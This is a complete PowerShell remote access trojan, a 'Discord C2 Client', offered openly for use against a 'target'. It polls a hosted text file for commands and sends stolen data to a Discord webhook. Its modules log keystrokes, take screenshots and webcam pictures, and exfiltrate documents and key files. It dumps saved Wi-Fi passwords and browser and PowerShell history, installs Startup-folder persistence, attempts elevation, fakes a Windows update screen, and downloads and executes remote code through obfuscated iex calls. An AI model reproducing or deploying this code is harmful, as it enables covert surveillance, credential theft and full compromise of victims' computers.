<# ============================================= Beigeworm's Discord C2 Client ========================================================

**SYNOPSIS**
Using a Discord Server Chat and a hosted text file to Act as a Command and Control Platform.

INFORMATION
This script will wait until it notices a change in the contents of a text file hosted online (eg. github).
Every 10 seconds it will check a file for a change in the file contents and interpret it as a custom command / module.

** Using github to host your command file will take up to 5 minutes to run each module - Use your own server to host the txt file for instant response **

USAGE
1. Setup the script
2. Run the script on a target.
3. Check discord for 'waiting to connect..' message.
4. Save the contents of your hosted file to contain 'options' to get a list of modules
5. Do the same with any other command listed - To run that module.

MODULES
= Close : Close the Session                           
= Screenshot  : Sends a screenshot of the desktop      
= Keycapture  : Capture Keystrokes and send           
= Exfiltrate : Send various files.                     
= Systeminfo : Send System info as text file.          
= TakePicture : Send a webcam picture.                 
= FolderTree : Save folder trees to file and send.     
= FakeUpdate : Spoof windows update screen.            
= CustomCommand : Execute a github file as a script.   

SETUP
1. change YOUR_GITHUB_FILE_URL to the url for the file that contains the command eg. https://raw.githubusercontent.com/Username/Repo/main/file.txt -OR- http://your.server.ip.here/files/file.txt 
2. change YOUR_WEBHOOK_URL to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx

EXTRA
You can add custom scripting in a secondary hosted file, change YOUR_OTHER_GITHUB_FILE_URL to another text file and add code to it,
then in the original hosted file save it with 'customcommand' as the contents 

Killswitch
Save a hosted file contents as 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands.
#>

# Uncomment the lines below and add you details
# $GHurl = "YOUR GITHUB FILE URL" 
# $CCurl = "YOUR SECONDARY GITHUB FILE URL"  # (optional)
# $hookurl = "YOUR WEBHOOK URL"

$parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
$response = Invoke-RestMethod -Uri $GHurl
$previouscmd = $response
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":link: ``WAITING FOR COMMANDS..`` :link:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

Function Options{

$msgsys = "``========================================================
================== Discord C2 Options ==================
========================================================
= Commands List -                                      =
========================================================
= Close  : Close this Session                          =
= Message : Send a message window to the User          =
= Screenshot  : Sends a screenshot of the desktop      =
= Keycapture   : Capture Keystrokes and send           =
= Exfiltrate : Send various files.                     =
= Systeminfo : Send System info as text file.          =
= TakePicture : Send a webcam picture.                 =
= FolderTree : Save folder trees to file and send.     =
= FakeUpdate : Spoof windows update screen.            =
= AddPersistance : Add this script to startup.         =
= RemovePersistance : Remove from startup              =
= CustomCommand : Execute a github file as a script.   =
= IsAdmin  : Check if the session is admin             =
= AttemptElevate : Attempt to restart script as admin  =
========================================================
= Examples and Info -                                  =
========================================================
= __To Exit Exiltrate or Keycapture__                  =
= set `$GHURL to a text file on github which contains  =
= the word 'False'. changing this word will exit       =
= the script.                                          =
========================================================``"
$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function FolderTree{
tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
$FilePath ="$env:temp/TreesOfKnowledge.zip"
Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
sleep 1
curl.exe -F file1=@"$FilePath" $hookurl
rm -Path $FilePath -Force
Write-Output "Done."
}

Function Message([string]$Message){
msg.exe * $Message
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function FakeUpdate {
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "C:\Windows\System32\scrnsave.scr"
WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
$pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 3
Remove-Item -Path $pth -Force
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function AddPersistance{
$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
$scriptContent | Out-File -FilePath $newScriptPath -force
sleep 1
if ($newScriptPath.Length -lt 100){
    "`$hookurl = `"$hookurl`"" | Out-File -FilePath $newScriptPath -Force
    "`$ghurl = `"$ghurl`"" | Out-File -FilePath $newScriptPath -Force -Append
    "`$ccurl = `"$ccurl`"" | Out-File -FilePath $newScriptPath -Force -Append
    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
    sleep 1
    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
    }
$tobat = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\PowerShell\copy.ps1""", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
$tobat | Out-File -FilePath $pth -Force
rm -path "$env:TEMP\temp.ps1" -Force
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Persistance Added!`` :white_check_mark:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function RemovePersistance{
rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
rm -Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Persistance Removed!`` :octagonal_sign:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function Exfiltrate {
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":file_folder: ``Exfiltration Started..`` :file_folder:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
$maxZipFileSize = 25MB
$currentZipSize = 0
$index = 1
$zipFilePath ="$env:temp/Loot$index.zip"
If($Path -ne $null){
$foldersToSearch = "$env:USERPROFILE\"+$Path
}else{
$foldersToSearch = @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
}
If($FileType -ne $null){
$fileExtensions = "*."+$FileType
}else {
$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
}
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
foreach ($folder in $foldersToSearch) {
    foreach ($extension in $fileExtensions) {
        $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
        foreach ($file in $files) {
            $fileSize = $file.Length
            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                $zipArchive.Dispose()
                $currentZipSize = 0
                curl.exe -F file1=@"$zipFilePath" $hookurl
                Sleep 1
                Remove-Item -Path $zipFilePath -Force
                $index++
                $zipFilePath ="$env:temp/Loot$index.zip"
                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
            }
            $entryName = $file.FullName.Substring($folder.Length + 1)
            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
            $currentZipSize += $fileSize
            $messages = Invoke-RestMethod -Uri $GHurl
            if ($messages -match "kill") {
                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"} | ConvertTo-Json
                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
                $previouscmd = $response
                break
            }
        }
    }
}
$zipArchive.Dispose()
curl.exe -F file1=@"$zipFilePath" $hookurl
sleep 5
Remove-Item -Path $zipFilePath -Force
}

Function SystemInfo{
$userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches ;$email = ("$email").Trim()
$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$videocardinfo = Get-WmiObject Win32_VideoController
$Hddinfo = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } ;$Hddinfo=($Hddinfo| Out-String) ;$Hddinfo = ("$Hddinfo").TrimEnd("")
$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$users = "$($userInfo.Name)"
$userString = "`nFull Name : $($userInfo.FullName)"
$OSString = "$($systemInfo.Caption) $($systemInfo.OSArchitecture)"
$systemString = "Processor : $($processorInfo.Name)"
$systemString += "`nMemory : $RamInfo"
$systemString += "`nGpu : $($videocardinfo.Name)"
$systemString += "`nStorage : $Hddinfo"
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw
$outpath = "$env:temp\systeminfo.txt"
$outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}

$infomessage = "``========================================================

Current User    : $env:USERNAME
Email Address   : $email
Language        : $systemLanguage
Keyboard Layout : $keyboardLayoutID
Other Accounts  : $users
Public IP       : $computerPubIP
Current OS      : $OSString
Hardware Info
--------------------------------------------------------
$systemString``"

"--------------------- SYSTEM INFORMATION for $env:COMPUTERNAME -----------------------`n" | Out-File -FilePath $outpath -Encoding ASCII
"General Info `n $infomessage" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Network Info `n -----------------------------------------------------------------------`n$outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
"USB Info  `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($COMDevices| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($software| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Processes  `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($process| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Services `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($service| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Drivers `n -----------------------------------------------------------------------`n$drivers" | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($Value| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
($Value2| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append

$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

Sleep 1
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$infomessage"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

curl.exe -F file1=@"$outpath" $hookurl
Sleep 1
Remove-Item -Path $outpath -force
}

Function IsAdmin{
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    }
    else{
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``You are Admin!`` :white_check_mark:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    }
}

Function AttemptElevate{
$tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
If Not WScript.Arguments.Named.Exists(`"elevate`") Then
  CreateObject(`"Shell.Application`").ShellExecute WScript.FullName _
    , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
  WScript.Quit
End If
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$hookurl='$hookurl';`$ghurl='$ghurl';`$ccurl='$ccurl'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex`", 0, True
"@
$pth = "C:\Windows\Tasks\service.vbs"
$tobat | Out-File -FilePath $pth -Force
& $pth
Sleep 7
rm -Path $pth
Write-Output "Done."
}

Function TakePicture {
$outputFolder = "$env:TEMP\8zTl45PSA"
$outputFile = "$env:TEMP\8zTl45PSA\captured_image.jpg"
$tempFolder = "$env:TEMP\8zTl45PSA\ffmpeg"
if (-not (Test-Path -Path $outputFolder)) {
    New-Item -ItemType Directory -Path $outputFolder | Out-Null
}
if (-not (Test-Path -Path $tempFolder)) {
    New-Item -ItemType Directory -Path $tempFolder | Out-Null
}
$ffmpegDownload = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
$ffmpegZip = "$tempFolder\ffmpeg-release-essentials.zip"
if (-not (Test-Path -Path $ffmpegZip)) {
    I`wr -Uri $ffmpegDownload -OutFile $ffmpegZip
}
Expand-Archive -Path $ffmpegZip -DestinationPath $tempFolder -Force
$videoDevice = $null
$videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Image' } | Select-Object -First 1
if (-not $videoDevice) {
    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Camera' } | Select-Object -First 1
}
if (-not $videoDevice) {
    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Media' } | Select-Object -First 1
}
if ($videoDevice) {
    $videoInput = $videoDevice.Name
    $ffmpegVersion = Get-ChildItem -Path $tempFolder -Filter "ffmpeg-*-essentials_build" | Select-Object -ExpandProperty Name
    $ffmpegVersion = $ffmpegVersion -replace 'ffmpeg-(\d+\.\d+)-.*', '$1'
    $ffmpegPath = Join-Path -Path $tempFolder -ChildPath ("ffmpeg-{0}-essentials_build\bin\ffmpeg.exe" -f $ffmpegVersion)
    & $ffmpegPath -f dshow -i video="$videoInput" -frames:v 1 $outputFile -y
} else {
}
    curl.exe -F "file1=@$outputFile" $hookurl
    sleep 1
    Remove-Item -Path $outputFile -Force
}

Function ScreenShot {
$Filett = "$env:temp\SC.png"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
Start-Sleep 1
curl.exe -F "file1=@$filett" $hookurl
Start-Sleep 1
Remove-Item -Path $filett
}

Function KeyCapture {
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Started`` :mag_right:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
$API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)
While ($true){
    $keyPressed = $false
    try{
    while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
        Start-Sleep -Milliseconds 30
        for ($asc = 8; $asc -le 254; $asc++){
        $keyst = $API::GetAsyncKeyState($asc)
            if ($keyst -eq -32767) {
            $keyPressed = $true
            $LastKeypressTime.Restart()
            $null = [console]::CapsLock
            $vtkey = $API::MapVirtualKey($asc, 3)
            $kbst = New-Object Byte[] 256
            $checkkbst = $API::GetKeyboardState($kbst)
            $logchar = New-Object -TypeName System.Text.StringBuilder          
                if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                $LString = $logchar.ToString()
                    if ($asc -eq 8) {$LString = "[BKSP]"}
                    if ($asc -eq 13) {$LString = "[ENT]"}
                    if ($asc -eq 27) {$LString = "[ESC]"}
                    $nosave += $LString 
                    }
                }
            }
        }
        $messages = Invoke-RestMethod -Uri $GHurl
        if ($messages -match "kill") {
        $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
        $previouscmd = $response
        break
        }
    }
    finally{
        If ($keyPressed -and $messages -notcontains "kill") {
            $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keys Captured :`` $escmsgsys"} | ConvertTo-Json
            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
            $keyPressed = $false
            $nosave = ""
        }
    }
$LastKeypressTime.Restart()
Start-Sleep -Milliseconds 10
}
}


while($true){
    $response = Invoke-RestMethod -Uri $GHurl

    if (!($response -match "$previouscmd")) {
    Write-Output "Command found!"
        if ($response -match "close") {
            $previouscmd = $response        
            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Closing Session.`` :octagonal_sign:"} | ConvertTo-Json
            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
            break
        }
        if ($response -match "options") {
            $previouscmd = $response 
            Options
        }
        if ($response -match "exfiltrate") {
            $previouscmd = $response
            Exfiltrate
        }
        if ($response -match "screenshot") {
            $previouscmd = $response
            ScreenShot
        }
        if ($response -match "keycapture") {
            $previouscmd = $response
            KeyCapture
        }
        if ($response -match "systeminfo") {
            $previouscmd = $response
            SystemInfo
        }
        if ($response -match "fakeupdate") {
            $previouscmd = $response
            FakeUpdate
        }
        if ($response -match "takepicture") {
            $previouscmd = $response
            TakePicture
        }
        if ($response -match "foldertree") {
            $previouscmd = $response
            FolderTree
        }
        if ($response -match "addpersistance") {
            $previouscmd = $response
            AddPersistance
        }
        if ($response -match "removepersistance") {
            $previouscmd = $response
            RemovePersistance
        }
        if ($response -match "customcommand") {
            $previouscmd = $response
            $customcommand = Invoke-RestMethod -Uri $CCurl | iex
        }
        if ($response -match "isadmmin") {
            $previouscmd = $response
            IsAdmin
        }
        if ($response -match "attemptelevate") {
            $previouscmd = $response
            AttemptElevate
        }
        elseif (!($response -match "$previouscmd")) {
            $Result=ie`x($response) -ErrorAction Stop
            if (($result.length -eq 0) -or ($result -contains "public_flags")){
                $previouscmd = $response
            }
            else{
                $previouscmd = $response
                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``$Result``"} | ConvertTo-Json
                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
            }
        }
    }
    else{
    write-output "No command found.."
    }
sleep 5
}

